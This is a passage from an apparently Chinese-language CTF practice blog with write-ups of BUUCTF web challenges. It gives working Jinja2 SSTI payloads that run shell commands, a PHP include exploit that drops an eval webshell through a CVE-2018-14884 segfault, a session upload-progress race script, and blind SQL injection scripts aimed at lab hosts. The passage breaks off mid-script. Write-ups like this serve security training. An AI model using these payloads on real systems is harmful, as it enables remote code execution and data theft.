</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">mid</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">       <span class="c1"># print(url + payload.format(i,mid))</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;JFIF&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">low</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">high</span> <span class="o">=</span> <span class="n">mid</span>
</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">low</span> <span class="o">+</span> <span class="n">high</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">mid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Áî®Êà∑ÂêçadminÔºåÂØÜÁ†Å84582e71d43b59c72f38</p>
<p>ËøõÊù•ÊòØ‰∏Ä‰∏™Êñá‰ª∂‰∏ä‰º†</p>
<p>Èöè‰æø‰∏ä‰º†ÂèëÁé∞‰∏ä‰º†Âà∞Êó•ÂøóÂéª‰∫ÜÔºåÁõ¥Êé•Êñá‰ª∂ÂêçÂÜôÊú®È©¨,Êó•ÂøóÊñá‰ª∂ÂåÖÂê´</p>
<h2 id="rootersctf2019i_3_flask">[RootersCTF2019]I_&lt;3_Flask
</h2><p>ËÇØÂÆöÊâìsstiÔºåÁàÜÂèÇÊï∞</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324193702165.png"
	width="1479"
	height="387"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324193702165_hu293114932105656086.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250324193702165_hu17943763455265594901.png 1024w"
	loading="lazy"
	
		alt="image-20250324193702165"
	
	
		class="gallery-image" 
		data-flex-grow="382"
		data-flex-basis="917px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;.__class__.__base__.__subclasses__()[182].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls&#34;).read()&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊäÑ‰∏Ä‰∏™Âà´‰∫∫ÁöÑ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__==&#39;catch_warnings&#39; %}{{ c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&#34;) }}{% endif %}{% endfor %}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="npuctf2020ezinclude">[NPUCTF2020]ezinclude
</h2><p>‰∏äÊù•ÂÖàÁúãÊ∫êÁ†Å</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324194857838.png"
	width="439"
	height="57"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324194857838_hu7139227941391235662.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250324194857838_hu14322387274611307026.png 1024w"
	loading="lazy"
	
		alt="image-20250324194857838"
	
	
		class="gallery-image" 
		data-flex-grow="770"
		data-flex-basis="1848px"
	
></p>
<p>Áî±‰∫é‰∏çÁü•ÈÅì$secretÁöÑÂÄºÔºåÊàë‰ª¨ÂÖà‰º†‰∏™nameÁúãÁúã</p>
<p>ÊääÂìçÂ∫îÁöÑhashÂ°´ÂÖ•ÂèëÂåÖ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?name=1&amp;pass=576322dd496b99d07b5b0f7fa7934a25
</span></span></code></pre></td></tr></table>
</div>
</div><p>Êúâ‰∏™flflflflag.php</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324195533675.png"
	width="1839"
	height="633"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250324195533675_hu12328814649236684761.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250324195533675_hu272906262207418579.png 1024w"
	loading="lazy"
	
		alt="image-20250324195533675"
	
	
		class="gallery-image" 
		data-flex-grow="290"
		data-flex-basis="697px"
	
></p>
<p>‰º™ÂçèËÆÆËØªÊñá‰ª∂</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?file=php://filter/read=convert.base64-encode/resource=flflflflag.php
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;html&gt;
</span></span><span class="line"><span class="cl">&lt;head&gt;
</span></span><span class="line"><span class="cl">&lt;script language=&#34;javascript&#34; type=&#34;text/javascript&#34;&gt;
</span></span><span class="line"><span class="cl">           window.location.href=&#34;404.html&#34;;
</span></span><span class="line"><span class="cl">&lt;/script&gt;
</span></span><span class="line"><span class="cl">&lt;title&gt;this_is_not_fl4g_and_Âá∫È¢ò‰∫∫_wants_girlfriend&lt;/title&gt;
</span></span><span class="line"><span class="cl">&lt;/head&gt;
</span></span><span class="line"><span class="cl">&lt;&gt;
</span></span><span class="line"><span class="cl">&lt;body&gt;
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">$file=$_GET[&#39;file&#39;];
</span></span><span class="line"><span class="cl">if(preg_match(&#39;/data|input|zip/is&#39;,$file)){
</span></span><span class="line"><span class="cl">	die(&#39;nonono&#39;);
</span></span><span class="line"><span class="cl">}
</span></span><span class="line"><span class="cl">@include($file);
</span></span><span class="line"><span class="cl">echo &#39;include($_GET[&#34;file&#34;])&#39;;
</span></span><span class="line"><span class="cl">?&gt;
</span></span><span class="line"><span class="cl">&lt;/body&gt;
</span></span><span class="line"><span class="cl">&lt;/html&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÁõÆÂΩïÊâ´Êèè‰ºöÂèëÁé∞dir.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nx">scandir</span><span class="p">(</span><span class="s1">&#39;/tmp&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ÁÑ∂Âêé</p>
<h3 id="Ê≥ï‰∏ÄÂà©Áî®php7-segment-faultÁâπÊÄßcve-2018-14884">Ê≥ï‰∏ÄÔºöÂà©Áî®php7 segment faultÁâπÊÄßÔºàCVE-2018-14884Ôºâ
</h3><p>php‰ª£Á†Å‰∏≠‰ΩøÁî®php://filterÁöÑ strip_tags ËøáÊª§Âô®, ÂèØ‰ª•ËÆ© php ÊâßË°åÁöÑÊó∂ÂÄôÁõ¥Êé•Âá∫Áé∞ Segment Fault , ËøôÊ†∑ php ÁöÑÂûÉÂúæÂõûÊî∂Êú∫Âà∂Â∞±‰∏ç‰ºöÂú®ÁªßÁª≠ÊâßË°å , ÂØºËá¥ POST ÁöÑÊñá‰ª∂‰ºö‰øùÂ≠òÂú®Á≥ªÁªüÁöÑÁºìÂ≠òÁõÆÂΩï‰∏ã‰∏ç‰ºöË¢´Ê∏ÖÈô§ËÄå‰∏çÂÉèphpinfoÈÇ£Ê†∑‰∏ä‰º†ÁöÑÊñá‰ª∂ÂæàÂø´Â∞±‰ºöË¢´Âà†Èô§ÔºåËøôÊ†∑ÁöÑÊÉÖÂÜµ‰∏ãÊàë‰ª¨Âè™ÈúÄË¶ÅÁü•ÈÅìÂÖ∂Êñá‰ª∂ÂêçÂ∞±ÂèØ‰ª•ÂåÖÂê´Êàë‰ª¨ÁöÑÊÅ∂ÊÑè‰ª£Á†Å„ÄÇ</p>
<p>‰ΩøÁî®php://filter/string.strip_tagsÂØºËá¥phpÂ¥©Ê∫ÉÊ∏ÖÁ©∫Â†ÜÊ†àÈáçÂêØÔºåÂ¶ÇÊûúÂú®ÂêåÊó∂‰∏ä‰º†‰∫Ü‰∏Ä‰∏™Êñá‰ª∂ÔºåÈÇ£‰πàËøô‰∏™tmp fileÂ∞±‰ºö‰∏ÄÁõ¥ÁïôÂú®tmpÁõÆÂΩïÔºåÁü•ÈÅìÊñá‰ª∂ÂêçÂ∞±ÂèØ‰ª•getshell„ÄÇËøô‰∏™Â¥©Ê∫ÉÂéüÂõ†ÊòØÂ≠òÂú®‰∏ÄÂ§ÑÁ©∫ÊåáÈíàÂºïÁî®„ÄÇÂêëPHPÂèëÈÄÅÂê´ÊúâÊñá‰ª∂Âå∫ÂùóÁöÑÊï∞ÊçÆÂåÖÊó∂ÔºåËÆ©PHPÂºÇÂ∏∏Â¥©Ê∫ÉÈÄÄÂá∫ÔºåPOSTÁöÑ‰∏¥Êó∂Êñá‰ª∂Â∞±‰ºöË¢´‰øùÁïôÔºå‰∏¥Êó∂Êñá‰ª∂‰ºöË¢´‰øùÂ≠òÂú®upload_tmp_dirÊâÄÊåáÂÆöÁöÑÁõÆÂΩï‰∏ãÔºåÈªòËÆ§‰∏∫tmpÊñá‰ª∂Â§π„ÄÇ</p>
<p>ËØ•ÊñπÊ≥ï‰ªÖÈÄÇÁî®‰∫é‰ª•‰∏ãphp7ÁâàÊú¨Ôºåphp5Âπ∂‰∏çÂ≠òÂú®ËØ•Â¥©Ê∫É„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php7.0.0-7.1.2ÂèØ‰ª•Âà©Áî®Ôºå 7.1.2xÁâàÊú¨ÁöÑÂ∑≤Ë¢´‰øÆÂ§ç
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">php7.1.3-7.2.1ÂèØ‰ª•Âà©Áî®Ôºå 7.2.1xÁâàÊú¨ÁöÑÂ∑≤Ë¢´‰øÆÂ§ç
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">php7.2.2-7.2.8ÂèØ‰ª•Âà©Áî®Ôºå 7.2.9‰∏ÄÁõ¥Âà∞7.3Âà∞Áé∞Âú®ÁöÑÁâàÊú¨Â∑≤Ë¢´‰øÆÂ§ç
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âà©Áî®url</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>ÊâìËøô‰∏™cve</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">io</span> <span class="kn">import</span> <span class="n">BytesIO</span> <span class="c1">#BytesIOÂÆûÁé∞‰∫ÜÂú®ÂÜÖÂ≠ò‰∏≠ËØªÂÜôbytes</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php eval($_POST[cmd]);?&gt;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;file&#39;</span><span class="p">:</span> <span class="n">BytesIO</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())}</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">files</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">allow_redirects</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÊ†∑Â∞±Âú®tmpÁõÆÂΩï‰∏ãÂÜôÂÖ•Êú®È©¨‰∫Ü</p>
<p>Êàë‰ª¨Áî®dir.phpÊü•Áúã‰ΩçÁΩÆ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php?file=/tmp/php3r0kqs
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøûÊé•‰∏äÁî®ËöÅÂâëÊèí‰ª∂ÁªïËøáÔºåÂèëÁé∞‰∏çË°åÔºåbpÂú®post‰º†ÂèÇcmd=phpinfo()ÁúãÁúãÔºåÁõ¥Êé•ÊêúflagÂ∞±Êúâ‰∫Ü</p>
<h3 id="Ê≥ï‰∫åÂà©Áî®-sessionupload_progress-ËøõË°å-session-Êñá‰ª∂ÂåÖÂê´">Ê≥ï‰∫åÔºöÂà©Áî® session.upload_progress ËøõË°å session Êñá‰ª∂ÂåÖÂê´
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">io</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">threading</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;http://60bd763e-32ea-4870-b67e-74f467c3436a.node5.buuoj.cn:81/flflflflag.php&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">sessid</span> <span class="o">=</span> <span class="s1">&#39;yym68686&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">POST</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">BytesIO</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">50</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="n">host</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;PHP_SESSION_UPLOAD_PROGRESS&#34;</span><span class="p">:</span><span class="s2">&#34;&lt;?php phpinfo();?&gt;&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">            <span class="n">files</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;file&#34;</span><span class="p">:(</span><span class="s1">&#39;a.txt&#39;</span><span class="p">,</span> <span class="n">f</span><span class="p">)},</span>
</span></span><span class="line"><span class="cl">            <span class="n">cookies</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;PHPSESSID&#39;</span><span class="p">:</span><span class="n">sessid</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">READ</span><span class="p">(</span><span class="n">session</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s1">?file=/tmp/sess_</span><span class="si">{</span><span class="n">sessid</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;flag{&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\r</span><span class="s1">Waiting...&#39;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\r</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;flag{(.*?)}&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">t1</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">POST</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">t1</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">    <span class="n">t1</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">READ</span><span class="p">(</span><span class="n">session</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="nctf2019sqli">[NCTF2019]SQLi
</h2><p>Êúâ‰∏™robots.txt</p>
<p>ËøôÈáåwaf‰∫Ü‰∏ÄÂ†ÜÂÖ≥ÈîÆÂ≠ó,Áî®Êà∑ÂêçÊòØadmin</p>
<p>‰∏ªË¶ÅÁî®regexpÊ≠£ÂàôÊù•ÁªïËøá</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from users where username=&#39;\&#39; and passwd=&#39;||/**/passwd/**/regexp/**/\&#34;^a\&#34;;%00&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">payload</span><span class="p">:</span> <span class="n">username</span><span class="o">=</span>\<span class="o">&amp;</span><span class="n">passwd</span><span class="o">=||</span><span class="n">passwd</span><span class="o">/**/</span><span class="n">regexp</span><span class="o">/**/</span><span class="s2">&#34;^a&#34;</span><span class="p">;</span><span class="o">%</span><span class="mi">00</span>
</span></span></code></pre></td></tr></table>
</div>
</div><ol>
<li>ÈÄöËøá<code>\</code> ËΩ¨‰πâusernameÂêéÁ¨¨‰∫å‰∏™ÂçïÂºïÂè∑ËøõËÄåÈó≠ÂêàÊéâpasswdÂêéÁ¨¨‰∏Ä‰∏™ÂºïÂè∑</li>
<li>ÈÄöËøá%00Êà™Êñ≠ ‰ª£Êõø# ‚Äì</li>
<li>regexp ‚Äú^a‚Äù Ë°®Á§∫ Êü•ÊâæpasswdÂàó‰∏≠‰ª•a‰∏∫Ëµ∑ÂßãÁöÑ</li>
</ol>
<p>Â¶ÇÊûúÊ≥®ÂÖ•ÊàêÂäü‰ºöÂõûÊòæwelcome.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">unquote</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://eec98765-3741-49a5-8773-6d1b31843e2e.node5.buuoj.cn:81/&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;UM_distinctid&#39;</span><span class="p">:</span> <span class="s1">&#39;17e150f6a59ecb-028dcf28d64a708-4c3e2679-384000-17e150f6a5a90d&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s1">&#39;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Origin&#39;</span><span class="p">:</span> <span class="s1">&#39;http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Connection&#39;</span><span class="p">:</span> <span class="s1">&#39;keep-alive&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;http://011634d2-f820-4831-b422-832c2e0bf99f.node4.buuoj.cn:81/&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Upgrade-Insecure-Requests&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">table</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;_</span><span class="si">{}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">50</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">table</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span>
